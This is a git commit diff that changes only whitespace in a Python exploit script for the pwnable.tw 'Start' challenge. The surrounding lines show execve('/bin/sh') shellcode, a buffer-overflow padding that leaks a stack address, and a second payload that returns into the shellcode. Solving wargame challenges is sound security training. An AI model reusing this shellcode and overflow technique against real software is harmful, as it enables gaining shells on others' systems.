94e89c2635f5d12aa5d631e6a2d756ff631188a3
Trần Trọng Huy <75942822+l1j9m4-0n1@users.noreply.github.com>
2022-03-29 14:12:53 +0700

    Update 1_Start.py

--- Pwnable.tw/1_Start.py
+++ Pwnable.tw/1_Start.py
@@ -9,10 +9,10 @@ shellcode = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x5
 pad = "A" * 0x14 + p32(0x08048087)		# ( address of 'mov ecx, esp' )
 io.recvuntil('CTF:')
 io.send(pad)
-leak = io.recv(4)						# address is strings
+leak = io.recv(4)						          # address is strings
 
 # payload2
-stack_add = u32(leak)					# address of stack
+stack_add = u32(leak)					        # address of stack
 print (hex(stack_add))
 payload = "A" * 0x14 + p32(stack_add + 0x14) + shellcode
 io.sendline(payload)
